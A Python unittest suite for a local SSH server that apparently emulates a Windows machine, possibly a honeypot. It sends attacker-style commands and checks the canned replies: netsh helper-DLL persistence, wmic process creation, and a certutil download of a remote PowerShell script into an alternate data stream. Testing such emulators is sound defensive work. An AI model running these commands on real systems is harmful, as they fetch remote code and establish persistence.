import unittest
import paramiko
import socket
import threading
import time

# Ensure that is correct in server file
SERVER_IP_ADDRESS = '127.0.0.1'
SERVER_PORT = 22
USERNAME = 'admin'
PASSWORD = 'admin'


def start_server():
    import demo_server  # Ensure the server code is named demo_server.py
    demo_server.main()


class TestSSHServerIntegration(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        # Start the server in a separate thread
        cls.server_thread = threading.Thread(target=start_server, daemon=True)
        cls.server_thread.start()
        time.sleep(2)  # Wait for the server to start

        # Setup SSH client
        cls.client = paramiko.SSHClient()
        cls.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def test_authenticate_and_execute_whoami(self):
        # Connect to the server
        self.client.connect(SERVER_IP_ADDRESS, port=SERVER_PORT, username=USERNAME, password=PASSWORD)

        # Open an SSH session and send the 'whoami' command
        channel = self.client.get_transport().open_session()
        channel.invoke_shell()
        channel.send('whoami\r')
        time.sleep(1)

        # Read the response
        output = channel.recv(1024).decode('utf-8')
        self.assertIn('desktop-h5p88jg\\janadm', output)

    def test_ipconfig_command(self):
        # Connect to the server
        self.client.connect(SERVER_IP_ADDRESS, port=SERVER_PORT, username=USERNAME, password=PASSWORD)

        # Open an SSH session and send the 'ipconfig' command
        channel = self.client.get_transport().open_session()
        channel.invoke_shell()
        channel.send('ipconfig\r')
        time.sleep(1)

        # Read the response
        output = channel.recv(4096).decode('utf-8')
        self.assertIn('Windows IP Configuration', output)
        self.assertIn('IPv4 Address', output)

    def test_netsh_command(self):
        self.client.connect(SERVER_IP_ADDRESS, port=SERVER_PORT, username=USERNAME, password=PASSWORD)

        channel = self.client.get_transport().open_session()
        channel.invoke_shell()
        channel.send('c:\windows\system32\\netsh.exe add helper helper.dll\r')
        time.sleep(1)

        # Read the response
        output = channel.recv(4096).decode('utf-8')
        self.assertIn('Ok.\r\n', output)

    def test_wmic_command(self):
        self.client.connect(SERVER_IP_ADDRESS, port=SERVER_PORT, username=USERNAME, password=PASSWORD)

        channel = self.client.get_transport().open_session()
        channel.invoke_shell()
        channel.send('wmic.exe process call create calc.exe\r')
        time.sleep(1)

        # Read the response
        output = channel.recv(4096).decode('utf-8')
        self.assertIn('Executing (Win32_Process)->Create()', output)


    def test_certutil_command(self):
        self.client.connect(SERVER_IP_ADDRESS, port=SERVER_PORT, username=USERNAME, password=PASSWORD)

        channel = self.client.get_transport().open_session()
        channel.invoke_shell()
        channel.send('certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\\temp:ttt\r')
        time.sleep(1)

        # Read the response
        output = channel.recv(4096).decode('utf-8')
        self.assertIn('CertUtil: -URLCache command completed successfully.', output)

    def test_cerutil_error(self):
        self.client.connect(SERVER_IP_ADDRESS, port=SERVER_PORT, username=USERNAME, password=PASSWORD)

        channel = self.client.get_transport().open_session()
        channel.invoke_shell()
        channel.send('certutil.exe error string\r')
        time.sleep(1)

        # Read the response
        output = channel.recv(4096).decode('utf-8')
        self.assertIn('(WIN32: 2 ERROR_FILE_NOT_FOUND)', output)



    @classmethod
    def tearDownClass(cls):
        cls.client.close()


if __name__ == '__main__':
    unittest.main()
